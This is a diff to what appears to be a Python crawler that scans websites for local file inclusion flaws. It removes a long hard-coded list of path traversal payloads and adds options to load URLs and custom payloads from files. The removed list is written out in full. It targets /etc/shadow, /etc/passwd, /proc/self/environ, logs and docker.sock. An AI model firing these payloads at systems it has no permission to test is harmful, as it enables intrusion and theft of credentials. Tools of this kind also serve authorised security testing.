@@ -27,74 +27,6 @@ payloads = [
     "../../etc/shadow",
     "../etc/shadow",
     "/etc/shadow",
-    "../../../../../../../../var/log/auth.log",
-    "../../../../../windows/win.ini",
-    "../../../../../../../../var/log/auth.log",
-    "../../../../../windows/win.ini",
-    "../../../../../../../../windows/system32/drivers/etc/hosts",
-    "../../../../../../../../usr/local/apache2/logs/error_log",
-    "../../../../../../../../proc/self/environ",
-    "../../../../../../../../etc/issue",
-    "../../../../../../../../opt/lampp/logs/access_log",
-    "../../../../../../../../etc/group",
-    "../../../../../../../../etc/hosts",
-    "../../../../../../../../etc/motd",
-    "../../../../../../../../etc/shells",
-    "../../../../../../../../etc/network/interfaces",
-    "../../../../../../../../etc/crontab",
-    "../../../../../../../../etc/apt/sources.list",
-    "../../../../../../../../etc/hostname",
-    "../../../../../../../../etc/resolv.conf",
-    "../../../../../../../../etc/mail.rc",
-    "../../../../../../../../etc/postfix/main.cf",
-    "../../../../../../../../etc/aliases",
-    "../../../../../../../../etc/exports",
-    "../../../../../../../../etc/fstab",
-    "../../../../../../../../etc/inittab",
-    "../../../../../../../../etc/ld.so.conf",
-    "../../../../../../../../etc/logrotate.conf",
-    "../../../../../../../../etc/mtab",
-    "../../../../../../../../etc/nsswitch.conf",
-    "../../../../../../../../etc/opt/samba/smb.conf",
-    "../../../../../../../../etc/profile",
-    "../../../../../../../../etc/protocols",
-    "../../../../../../../../etc/securetty",
-    "../../../../../../../../etc/services",
-    "../../../../../../../../etc/sysctl.conf",
-    "../../../../../../../../etc/systemd/system.conf",
-    "../../../../../../../../etc/timezone",
-    "../../../../../../../../etc/vsftpd.conf",
-    "../../../../../../../../usr/lib/python3/dist-packages/apt_pkg.so",
-    "../../../../../../../../usr/share/common-licenses/GPL",
-    "../../../../../../../../var/log/alternatives.log",
-    "../../../../../../../../var/log/apport.log",
-    "../../../../../../../../var/log/apt/history.log",
-    "../../../../../../../../var/log/apt/term.log",
-    "../../../../../../../../var/log/auth.log",
-    "../../../../../../../../var/log/boot.log",
-    "../../../../../../../../var/log/dpkg.log",
-    "../../../../../../../../var/log/faillog",
-    "../../../../../../../../var/log/kern.log",
-    "../../../../../../../../var/log/lastlog",
-    "../../../../../../../../var/log/syslog",
-    "../../../../../../../../var/log/wtmp",
-    "../../../../../../../../var/log/xferlog",
-    "../../../../../../../../var/www/html/index.html",
-    "../../../../../../../../proc/self/cmdline",
-    "../../../../../../../../proc/self/status",
-    "../../../../../../../../proc/version",
-    "../../../../../../../../proc/net/arp",
-    "../../../../../../../../proc/net/fib_trie",
-    "../../../../../../../../proc/net/tcp",
-    "../../../../../../../../proc/net/udp",
-    "../../../../../../../../proc/net/unix",
-    "../../../../../../../../proc/net/route",
-    "../../../../../../../../proc/net/rt_cache",
-    "../../../../../../../../proc/self/mounts",
-    "../../../../../../../../var/run/utmp",
-    "../../../../../../../../var/run/docker.sock"
-    "/etc/passwd"
-    
 ]
 
 # 🔁 Visited URLs to avoid duplicates
@@ -182,6 +114,30 @@ def test_lfi(url):
         output_results.append(error_message)
     return False
 
+def load_from_file(file_path):
+    """
+    📂 Load URLs from a file.
+    """
+    urls = []
+    try:
+        with open(file_path, 'r') as file:
+            urls = [line.strip() for line in file.readlines()]
+    except Exception as e:
+        print(f"❌ Error loading URLs from file {file_path}: {e}")
+    return urls
+
+def load_payloads_from_file(file_path):
+    """
+    📂 Load custom LFI payloads from a file.
+    """
+    payloads = []
+    try:
+        with open(file_path, 'r') as file:
+            payloads = [line.strip() for line in file.readlines()]
+    except Exception as e:
+        print(f"❌ Error loading payloads from file {file_path}: {e}")
+    return payloads
+
 def crawl_and_test(urls, output_file="lfi_results.json", max_depth=3):
     """
     🔍 Crawl a list of URLs and their subdomains to find potential LFI vulnerabilities.
@@ -232,6 +188,12 @@ if __name__ == "__main__":
 
     output_file = input("📂 Enter the name of the output file (leave blank for default 'lfi_results.json'): ").strip()
     output_file = output_file if output_file else "lfi_results.json"
+
+    payloads_option = input("📂 Do you want to load custom LFI payloads from a file? (y/n): ").lower()
+    if payloads_option == 'y':
+        payloads_file_path = input("📂 Enter the path to the payloads.txt file containing payloads: ")
+
+        payloads = load_payloads_from_file(payloads_file_path)
 
     # Retrieve Wayback URLs and add them to the crawl list
     wayback_urls = get_wayback_urls(urls[0])
